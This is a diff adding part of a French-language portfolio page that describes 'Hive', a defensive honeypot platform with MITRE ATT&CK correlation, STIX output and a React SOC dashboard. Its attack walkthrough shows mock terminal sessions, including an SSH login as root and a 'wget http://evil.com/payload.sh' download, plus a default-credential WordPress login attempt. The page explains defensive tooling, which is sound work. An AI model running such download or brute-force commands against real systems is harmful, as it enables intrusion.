+              <!-- MITRE + STIX -->
+              <div class="arch-row" style="gap:12px;">
+                <div class="arch-node node-mitre" style="flex:1;">
+                  <div class="node-label">🎯 MITRE ATT&amp;CK Engine</div>
+                  <div class="node-desc">internal/mitre/<br>TTP Correlation &amp; Tagging</div>
+                </div>
+                <div class="arch-node node-mitre" style="flex:1;">
+                  <div class="node-label">📦 IOC Store &amp; STIX Processor</div>
+                  <div class="node-desc">internal/store/<br>STIX 2.1 + iptables blocklists</div>
+                </div>
+              </div>
+
+              <div class="arch-arrow"><i class="bi bi-arrow-down"></i></div>
+
+              <!-- API + WebSocket -->
+              <div class="arch-row">
+                <div class="arch-node node-api">
+                  <div class="node-label">🔌 REST API &amp; WebSocket Stream</div>
+                  <div class="node-desc">internal/api/ — Port 8000 — &lt;10ms event delivery</div>
+                </div>
+              </div>
+
+              <div class="arch-arrow"><i class="bi bi-arrow-down"></i></div>
+
+              <!-- React Dashboard -->
+              <div class="arch-row">
+                <div class="arch-node node-react">
+                  <div class="node-label">⚛️ React 19 — Cyber Operations Dashboard</div>
+                  <div class="node-desc">frontend/ — TypeScript — Real-time Attack Feed — IOC Map — TTP Timeline</div>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══════════════ REACT DASHBOARD UI ═══════════════ -->
+      <section class="hive-section hive-section-dark">
+        <div class="container">
+          <div class="row align-items-center g-5">
+            <div class="col-lg-6" data-aos="fade-right">
+              <p class="hive-section-title">Frontend — SOC Dashboard</p>
+              <h2 class="hive-section-heading">React 19 <span class="accent">Cyber Ops</span> Dashboard</h2>
+              <p class="hive-section-lead">
+                Le dashboard est une Single Page Application construite avec React 19 et TypeScript, conçue pour absorber des flux d'événements haute fréquence sans perte de frame.
+              </p>
+
+              <div class="row g-3 mt-3">
+                <div class="col-12">
+                  <div class="deepdive-card" style="padding: 20px;">
+                    <div class="d-flex align-items-start gap-3">
+                      <div class="card-icon-wrap icon-teal" style="flex-shrink:0; width:40px; height:40px; font-size:1.1rem;">
+                        <i class="bi bi-lightning-charge-fill"></i>
+                      </div>
+                      <div>
+                        <h4 style="font-size:0.95rem; margin-bottom:6px;">React 19 Concurrent Mode</h4>
+                        <p style="margin:0;">Utilise le <strong>Concurrent Rendering</strong> de React 19 pour ne jamais bloquer l'UI lors d'un pic d'événements réseau. Les flux WebSocket sont traités en background sans impacter l'interactivité.</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="deepdive-card" style="padding: 20px;">
+                    <div class="d-flex align-items-start gap-3">
+                      <div class="card-icon-wrap icon-green" style="flex-shrink:0; width:40px; height:40px; font-size:1.1rem;">
+                        <i class="bi bi-graph-up-arrow"></i>
+                      </div>
+                      <div>
+                        <h4 style="font-size:0.95rem; margin-bottom:6px;">Live Attack Feed &amp; IOC Map</h4>
+                        <p style="margin:0;">Visualisation en temps réel du flux d'attaques, cartographie géographique des IOCs, timeline des TTPs MITRE et console d'alertes avec criticité colorisée.</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="deepdive-card" style="padding: 20px;">
+                    <div class="d-flex align-items-start gap-3">
+                      <div class="card-icon-wrap icon-purple" style="flex-shrink:0; width:40px; height:40px; font-size:1.1rem;">
+                        <i class="bi bi-broadcast-pin"></i>
+                      </div>
+                      <div>
+                        <h4 style="font-size:0.95rem; margin-bottom:6px;">WebSocket Streaming &lt;10ms</h4>
+                        <p style="margin:0;">Connexion WebSocket persistante vers <code>ws://localhost:8000</code>. Chaque événement généré côté Go est poussé instantanément sans polling.</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-6" data-aos="fade-left" data-aos-delay="100">
+              <!-- Simulated Dashboard Preview -->
+              <div class="terminal-window">
+                <div class="terminal-header">
+                  <span class="terminal-dot dot-red"></span>
+                  <span class="terminal-dot dot-yellow"></span>
+                  <span class="terminal-dot dot-green"></span>
+                  <span class="terminal-title">🐝 HIVE — Cyber Operations Dashboard</span>
+                </div>
+                <div class="terminal-body">
+                  <div><span class="t-comment">// === LIVE ATTACK FEED ===========================</span></div>
+                  <div><span class="t-alert">⚠ [CRITICAL]</span> <span class="t-output">SSH Brute-Force</span> <span class="t-info">192.168.1.54</span> <span class="t-success">→ T1110.001</span></div>
+                  <div><span class="t-warn">⚡ [HIGH]   </span> <span class="t-output">HTTP Scan</span> <span class="t-info">10.0.0.23  </span> <span class="t-success">→ T1595.002</span></div>
+                  <div><span class="t-warn">⚡ [HIGH]   </span> <span class="t-output">MySQL Auth </span> <span class="t-info">45.33.32.156</span> <span class="t-success">→ T1190     </span></div>
+                  <div><span class="t-output">ℹ [MED]    </span> <span class="t-output">Redis RESP </span> <span class="t-info">172.16.0.4  </span> <span class="t-success">→ T1078     </span></div>
+                  <br>
+                  <div><span class="t-comment">// === IOC STORE — STIX 2.1 OUTPUT ================</span></div>
+                  <div><span class="t-success">✔</span> <span class="t-output">stix:indicator created</span> <span class="t-info">id:indicator--a2c4...</span></div>
+                  <div><span class="t-success">✔</span> <span class="t-output">stix:malware   linked </span> <span class="t-info">id:malware--f8e1...</span></div>
+                  <div><span class="t-success">✔</span> <span class="t-output">iptables BLOCK  pushed</span> <span class="t-warn">192.168.1.54/32</span></div>
+                  <br>
+                  <div><span class="t-comment">// === WEBSOCKET STREAM ============================</span></div>
+                  <div><span class="t-info">ws://localhost:8000 </span><span class="t-success">CONNECTED</span> <span class="t-output">latency: 4ms</span></div>
+                  <div><span class="t-output">events/sec: </span><span class="t-warn">247</span> <span class="t-output">| goroutines: </span><span class="t-info">1,204</span></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══════════════ ATTACK WALKTHROUGH ═══════════════ -->
+      <section class="hive-section hive-section-mid">
+        <div class="container">
+          <div class="row mb-5" data-aos="fade-up">
+            <div class="col-lg-8">
+              <p class="hive-section-title">Simulation d'Attaque Guidée</p>
+              <h2 class="hive-section-heading">Attack <span class="accent">Walkthrough</span> — Hive en Action</h2>
+              <p class="hive-section-lead">
+                Scénario réel : un attaquant découvre Hive et commence son opération. Voici comment la plateforme capture, analyse et neutralise chaque étape.
+              </p>
+            </div>
+          </div>
+
+          <div class="row g-5">
+            <div class="col-lg-6">
+              <!-- Step 1 -->
+              <div class="walkthrough-step" data-aos="fade-up">
+                <div class="step-number">1</div>
+                <div class="step-label">Phase 1 — Initial Access via SSH</div>
+                <div class="step-title">🐚 L'attaquant se connecte au SSH Honeypot (port 2222)</div>
+                <div class="step-desc">Un attaquant scanne le réseau, découvre le port 2222 et tente une connexion SSH avec des credentials par défaut. Le piège SSH PTY accepte la connexion et présente un faux shell interactif.</div>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-dot dot-red"></span>
+                    <span class="terminal-dot dot-yellow"></span>
+                    <span class="terminal-dot dot-green"></span>
+                    <span class="terminal-title">attacker@kali — SSH Session</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="t-prompt">$ </span><span class="t-cmd">ssh root@target -p 2222</span></div>
+                    <div><span class="t-output">root@target's password: </span><span class="t-warn">***</span></div>
+                    <div><span class="t-success">Welcome to Ubuntu 22.04.3 LTS</span></div>
+                    <div><span class="t-output">Last login: Mon Jul 21 08:42:11 2026</span></div>
+                    <div><span class="t-prompt">root@target:~# </span><span class="t-cmd">wget http://evil.com/payload.sh</span></div>
+                    <div><span class="t-success">--2026-07-21 11:42:19-- http://evil.com/payload.sh</span></div>
+                    <div><span class="t-warn">Connecting to evil.com... connected.</span></div>
+                    <div><span class="t-comment">// 🐝 HIVE CAPTURED: wget evil.com → T1105</span></div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Step 2 -->
+              <div class="walkthrough-step" data-aos="fade-up" data-aos-delay="100">
+                <div class="step-number">2</div>
+                <div class="step-label">Phase 2 — Web Reconnaissance</div>
+                <div class="step-title">🌐 Le piège HTTP intercepte un scan WordPress</div>
+                <div class="step-desc">En parallèle, un scanner automatisé tente d'accéder à <code>/wp-login.php</code> sur le port 8080. Le honeypot HTTP répond avec une fausse page WordPress qui enregistre toutes les requêtes.</div>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-dot dot-red"></span>
+                    <span class="terminal-dot dot-yellow"></span>
+                    <span class="terminal-dot dot-green"></span>
+                    <span class="terminal-title">Hive HTTP Trap — Port 8080</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="t-info">→ GET</span> <span class="t-output">/wp-login.php</span> <span class="t-warn">10.0.0.23</span></div>
+                    <div><span class="t-info">→ POST</span> <span class="t-output">/wp-login.php</span> <span class="t-warn">user=admin&amp;pass=admin123</span></div>
+                    <div><span class="t-info">→ GET</span> <span class="t-output">/phpmyadmin/</span> <span class="t-warn">10.0.0.23</span></div>
+                    <div><span class="t-alert">⚡ TTP Detected: T1595.002 — Active Scanning</span></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-6">
+              <!-- Step 3 -->
+              <div class="walkthrough-step" data-aos="fade-up" data-aos-delay="50">
+                <div class="step-number">3</div>
+                <div class="step-label">Phase 3 — MITRE Correlation &amp; CTI Output</div>
+                <div class="step-title">🎯 Le moteur MITRE identifie les TTPs et génère le renseignement</div>
+                <div class="step-desc">Le moteur d'analyse corrèle les commandes brutes aux TTPs MITRE ATT&amp;CK, puis le processeur IOC génère automatiquement les fichiers de blocage et le rapport STIX 2.1.</div>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-dot dot-red"></span>
+                    <span class="terminal-dot dot-yellow"></span>
+                    <span class="terminal-dot dot-green"></span>
+                    <span class="terminal-title">Hive — CTI Pipeline Output</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="t-comment">// MITRE ATT&CK Correlations</span></div>
+                    <div><span class="t-success">→ T1105</span> <span class="t-output">Ingress Tool Transfer   </span><span class="t-warn">wget evil.com</span></div>
+                    <div><span class="t-success">→ T1110</span> <span class="t-output">Brute Force            </span><span class="t-warn">SSH :2222</span></div>
+                    <div><span class="t-success">→ T1595</span> <span class="t-output">Active Scanning        </span><span class="t-warn">/wp-login.php</span></div>
+                    <br>
+                    <div><span class="t-comment">// STIX 2.1 Generated</span></div>
+                    <div><span class="t-info">✔ threat-intel.stix.json</span> <span class="t-success">WRITTEN</span></div>
+                    <div><span class="t-info">✔ iptables-blocklist.txt </span> <span class="t-success">UPDATED</span></div>
+                    <div><span class="t-warn">  → BLOCK 192.168.1.54/32</span></div>
+                    <div><span class="t-warn">  → BLOCK 10.0.0.23/32</span></div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Step 4 -->
+              <div class="walkthrough-step" data-aos="fade-up" data-aos-delay="150">
+                <div class="step-number">4</div>
+                <div class="step-label">Phase 4 — Real-Time SOC Alert</div>
+                <div class="step-title">⚛️ Le dashboard React 19 affiche l'alerte instantanément</div>
+                <div class="step-desc">Via le WebSocket stream, le dashboard React 19 reçoit l'événement en moins de 10ms. L'analyste SOC voit l'alerte en temps réel avec le TTP, l'IOC, la géolocalisation et les actions recommandées.</div>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-dot dot-red"></span>
+                    <span class="terminal-dot dot-yellow"></span>
+                    <span class="terminal-dot dot-green"></span>
+                    <span class="terminal-title">React SOC Dashboard — Alert Feed</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div><span class="t-comment">// WebSocket Event Received (4ms)</span></div>
+                    <div><span class="t-alert">🔴 CRITICAL ALERT TRIGGERED</span></div>
+                    <div><span class="t-output">  attacker_ip : </span><span class="t-warn">192.168.1.54</span></div>
+                    <div><span class="t-output">  protocol    : </span><span class="t-info">SSH</span></div>
+                    <div><span class="t-output">  ttp_id      : </span><span class="t-success">T1105, T1110.001</span></div>
+                    <div><span class="t-output">  ioc_type    : </span><span class="t-warn">ipv4-addr, url</span></div>
+                    <div><span class="t-output">  stix_bundle : </span><span class="t-info">bundle--e3a1...</span></div>
+                    <div><span class="t-success">  action      : iptables BLOCKED ✔</span></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══════════════ PROJECT STRUCTURE ═══════════════ -->
+      <section class="hive-section hive-section-alt">
+        <div class="container">
+          <div class="row g-5 align-items-start">
+            <div class="col-lg-5" data-aos="fade-right">
+              <p class="hive-section-title">Clean Architecture</p>
+              <h2 class="hive-section-heading">Structure du <span class="accent">Projet</span></h2>
+              <p class="hive-section-lead">
+                Hive suit les principes de la <strong>Clean Architecture Go</strong> côté backend et les bonnes pratiques d'une <strong>SPA React</strong> côté frontend : séparation stricte des responsabilités, testabilité et extensibilité.
+              </p>
+              <div class="row g-3 mt-3">
+                <div class="col-12">
+                  <div class="deepdive-card" style="padding:16px 20px;">
+                    <div class="d-flex gap-3 align-items-center">
+                      <div class="card-icon-wrap icon-amber" style="width:36px;height:36px;font-size:1rem;flex-shrink:0;"><i class="bi bi-layers-fill"></i></div>
+                      <div>
+                        <h4 style="font-size:0.9rem;margin:0 0 4px;">Separation of Concerns (SoC)</h4>
+                        <p style="margin:0;font-size:0.82rem;">Chaque package Go a une responsabilité unique : listeners, event bus, MITRE engine, store et API sont totalement découplés.</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="deepdive-card" style="padding:16px 20px;">
+                    <div class="d-flex gap-3 align-items-center">
+                      <div class="card-icon-wrap icon-teal" style="width:36px;height:36px;font-size:1rem;flex-shrink:0;"><i class="bi bi-arrow-repeat"></i></div>
+                      <div>
+                        <h4 style="font-size:0.9rem;margin:0 0 4px;">Event-Driven Design Pattern</h4>
+                        <p style="margin:0;font-size:0.82rem;">Pas de couplage direct entre les honeypots et les processeurs. Tout communique via le bus d'événements central.</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="deepdive-card" style="padding:16px 20px;">
+                    <div class="d-flex gap-3 align-items-center">
+                      <div class="card-icon-wrap icon-green" style="width:36px;height:36px;font-size:1rem;flex-shrink:0;"><i class="bi bi-puzzle-fill"></i></div>
+                      <div>
+                        <h4 style="font-size:0.9rem;margin:0 0 4px;">Extensible par Design</h4>
+                        <p style="margin:0;font-size:0.82rem;">Ajouter un nouveau honeypot (FTP, SMTP, RDP) revient à créer un nouveau package <code>internal/ftpd/</code> et l'enregistrer dans le bus.</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-7" data-aos="fade-left" data-aos-delay="100">
+              <div class="file-tree">
+                <div><span class="ft-root">🐝 hive/</span> <span class="ft-comment">— Advanced Honeypot Network</span></div>
+
+                <div class="ft-indent1"><span class="ft-dir">📁 cmd/hive/</span>                <span class="ft-comment">— Point d'entrée &amp; orchestrateur principal</span></div>
+                <div class="ft-indent2"><span class="ft-file">└── main.go</span>                 <span class="ft-comment">— Démarre tous les listeners en parallel</span></div>
+
+                <div class="ft-indent1"><span class="ft-dir">📁 internal/</span></div>
+                <div class="ft-indent1">
+                  <div class="ft-indent1"><span class="ft-dir">📁 sshd/</span>                   <span class="ft-comment">— 🐚 SSH Trap avec PTY interactif</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── handler.go</span>             <span class="ft-comment">— Pseudo-Terminal, capture commandes</span></div>
+
+                  <div class="ft-indent1"><span class="ft-dir">📁 httpd/</span>                   <span class="ft-comment">— 🌐 Pièges HTTP (WordPress, phpMyAdmin)</span></div>
+                  <div class="ft-indent2"><span class="ft-file">├── wordpress.go</span>           <span class="ft-comment">— Émulation /wp-login.php</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── phpmyadmin.go</span>          <span class="ft-comment">— Émulation phpMyAdmin</span></div>
+
+                  <div class="ft-indent1"><span class="ft-dir">📁 mysqld/</span>                  <span class="ft-comment">— 🗄️ Capture auth MySQL</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── protocol.go</span>            <span class="ft-comment">— Handshake MySQL, credential logging</span></div>
+
+                  <div class="ft-indent1"><span class="ft-dir">📁 redisd/</span>                  <span class="ft-comment">— ⚡ Parser protocole RESP (Redis)</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── resp.go</span>                <span class="ft-comment">— Parser RESP, détection CONFIG SET</span></div>
+
+                  <div class="ft-indent1"><span class="ft-dir">📁 event/</span>                   <span class="ft-comment">— ⚡ Bus d'événements Lock-Free</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── bus.go</span>                 <span class="ft-comment">— Go channels non-bloquants</span></div>
+
+                  <div class="ft-indent1"><span class="ft-dir">📁 mitre/</span>                   <span class="ft-comment">— 🎯 Moteur MITRE ATT&amp;CK</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── correlate.go</span>           <span class="ft-comment">— Mapping commandes → TTP IDs</span></div>
+
+                  <div class="ft-indent1"><span class="ft-dir">📁 store/</span>                   <span class="ft-comment">— 📦 IOC Store &amp; CTI Processor</span></div>
+                  <div class="ft-indent2"><span class="ft-file">├── stix.go</span>                <span class="ft-comment">— Génération STIX 2.1 JSON</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── blocklist.go</span>           <span class="ft-comment">— Export iptables-blocklist.txt</span></div>
+
+                  <div class="ft-indent1"><span class="ft-dir">📁 api/</span>                     <span class="ft-comment">— 🔌 Serveur HTTP REST &amp; WebSocket</span></div>
+                  <div class="ft-indent2"><span class="ft-file">├── rest.go</span>                <span class="ft-comment">— Endpoints REST Port 8000</span></div>
+                  <div class="ft-indent2"><span class="ft-file">└── websocket.go</span>           <span class="ft-comment">— Streaming temps réel &lt;10ms</span></div>
+                </div>
+
+                <div class="ft-indent1"><span class="ft-dir">📁 frontend/</span>                <span class="ft-comment">— ⚛️ React 19 + TypeScript SPA</span></div>
+                <div class="ft-indent2"><span class="ft-file">├── src/</span></div>
+                <div class="ft-indent2"><span class="ft-file">│   ├── components/</span>         <span class="ft-comment">— Dashboard, Feed, IOCMap</span></div>
+                <div class="ft-indent2"><span class="ft-file">│   └── hooks/useWebSocket.ts</span> <span class="ft-comment">— WebSocket hook React</span></div>
+                <div class="ft-indent2"><span class="ft-file">└── package.json</span></div>
+
+                <div class="ft-indent1"><span class="ft-file">📄 go.mod</span></div>
+                <div class="ft-indent1"><span class="ft-file">📄 README.md</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══════════════ ETHICAL DISCLAIMER ═══════════════ -->
+      <section class="hive-section hive-section-mid">
+        <div class="container">
+          <div class="row justify-content-center" data-aos="fade-up">
+            <div class="col-lg-9">
+              <div class="ethics-card">
+                <div class="d-flex align-items-start gap-3">
+                  <div style="font-size:2rem; flex-shrink:0;">⚖️</div>
+                  <div>
+                    <h4>Éthique &amp; Utilisation Responsable — Avertissement Légal</h4>
+                    <p><strong>Hive est un outil de recherche en sécurité défensive.</strong> Cette plateforme de cyber-déception est conçue exclusivement pour :</p>
+                    <ul>
+                      <li>Le déploiement sur vos propres infrastructures et réseaux avec autorisation explicite.</li>
+                      <li>La recherche académique et les environnements de laboratoire contrôlés.</li>
+                      <li>La collecte de renseignements sur les menaces (CTI) pour renforcer la posture de sécurité défensive.</li>
+                      <li>Les exercices de <em>red team / blue team</em> dans des cadres légaux définis.</li>
+                    </ul>
+                    <p><strong>Utiliser ce projet sur des systèmes sans autorisation explicite constitue une infraction pénale.</strong> L'auteur décline toute responsabilité pour tout usage illicite ou abusif de cette plateforme. Respectez toujours les lois locales en vigueur sur la cybersécurité et les systèmes informatiques.</p>
+                    <div class="mt-3 p-2 rounded" style="background:rgba(239,68,68,0.1); border-left:3px solid #ef4444;">
+                      <span style="font-size:0.82rem; color:#fca5a5; font-family:var(--mono);">
+                        🛡️ Ethical Hacking only — Deploy on authorized networks — Legal use only
+                      </span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </main>
+
+    <!-- ═══════════════ PROJECT NAVIGATION ═══════════════ -->
+    <div class="hive-nav">
+      <div class="container">
+        <div class="hive-nav-inner">
+          <a href="inversehacker.html" class="nav-btn nav-btn-outline" id="prev-project-btn">
+            <i class="bi bi-arrow-left"></i>
+            <div>
+              <div style="font-size:0.7rem; opacity:0.5; text-transform:uppercase; letter-spacing:0.1em;">Projet Précédent</div>
+              <div style="font-size:0.88rem;">InverseHacker</div>
+            </div>
+          </a>
+          <a href="index.html#portfolio" class="nav-btn nav-btn-outline" id="all-projects-btn">
+            <i class="bi bi-grid-fill"></i>
+            Tous les Projets
+          </a>
+          <a href="soc.html" class="nav-btn nav-btn-primary" id="next-project-btn">
+            <div>
+              <div style="font-size:0.7rem; opacity:0.7; text-transform:uppercase; letter-spacing:0.1em;">Projet Suivant</div>
+              <div style="font-size:0.88rem;">SOC Analyste</div>
+            </div>
+            <i class="bi bi-arrow-right"></i>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══════════════ FOOTER ═══════════════ -->
+    <footer id="footer" class="footer">
+      <div class="container footer-top">
+        <div class="row gy-4">
+          <div class="col-lg-6 col-md-12 footer-about">
+            <a href="index.html" class="logo d-flex align-items-center">
+              <span class="sitename">Jeanluck Cyber Insights</span>
+            </a>
+            <p>
+              Bienvenue dans mon espace en ligne. Je suis Jeanluck, un chercheur passionné en cybersécurité et pentester. Ici, je partage mes analyses, mes explorations techniques approfondies et mes découvertes dans le monde en constante évolution de la sécurité numérique.
+            </p>
+            <div class="social-links d-flex mt-4">
+              <a href="https://.com/IrJeanl"><i class="bi bi-twitter-x"></i></a>
+              <a href="https://github.com/Jeanluck"><i class="bi bi-github"></i></a>
+              <a href="https://linkedin.com/in/jeanluckndato"><i class="bi bi-linkedin"></i></a>
+            </div>
+          </div>
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4>Catégories de Projects</h4>
+            <ul>
+              <li><a href="#">Tests d'intrusion</a></li>
+              <li><a href="#">Cyber Deception</a></li>
+              <li><a href="#">Analyse de Malware</a></li>
+              <li><a href="#">Sécurité Réseau</a></li>
+              <li><a href="#">Réponse aux Incidents</a></li>
+            </ul>
+          </div>
+          <div class="col-lg-3 col-md-6 footer-contact text-center text-md-start">
+            <h4>Connectez-vous avec moi</h4>
+            <p>Vous avez une question, une idée de collaboration ou souhaitez simplement échanger sur la cybersécurité ?</p>
+            <p class="mt-4"><strong>Email :</strong> <span>jeanlucndato@gmail.com</span></p>
+          </div>
+        </div>
+      </div>
+      <div class="container copyright text-center mt-4">
+        <p>© <span>Droit d'auteur</span> <strong class="px-1 sitename">Jeanluck Ndato</strong> <span>Tous droits réservés</span></p>
+        <div class="credits">Conçu &amp; Maintenu par <a href="https://github.com/JeanluckNdato">INVERSEHACKER</a></div>
+      </div>
+    </footer>
+
+    <!-- Scroll Top -->
+    <a href="#" id="scroll-top" class="scroll-top d-flex align-items-center justify-content-center">
+      <i class="bi bi-arrow-up-short"></i>
+    </a>
+
+    <!-- Preloader -->
+    <div id="preloader"></div>
+
+    <!-- Vendor JS Files -->
+    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/vendor/php-email-form/validate.js"></script>
+    <script src="assets/vendor/aos/aos.js"></script>
+    <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
+    <script src="assets/vendor/imagesloaded/imagesloaded.pkgd.min.js"></script>
+    <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+    <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+
+    <!-- Main JS File -->
+    <script src="assets/js/main.js"></script>
+
+    <script>
+      // Animate terminal text on load
+      document.addEventListener('DOMContentLoaded', () => {
+        // AOS init
+        if (typeof AOS !== 'undefined') {
+          AOS.init({ duration: 700, easing: 'ease-in-out', once: true });
+        }
+
+        // Typing cursor blink effect on terminal windows
+        const terminalBodies = document.querySelectorAll('.terminal-body');
+        terminalBodies.forEach(body => {
+          const lastLine = body.lastElementChild;
+          if (lastLine) {
+            const cursor = document.createElement('span');
+            cursor.style.cssText = 'display:inline-block;width:8px;height:1em;background:rgba(245,158,11,0.8);margin-left:2px;vertical-align:text-bottom;animation:blink 1s step-end infinite;';
+            lastLine.appendChild(cursor);
+          }
+        });
+
+        // Add blink keyframe
+        const style = document.createElement('style');
+        style.textContent = '@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }';
+        document.head.appendChild(style);
+      });
+    </script>
+  </body>
+</html>
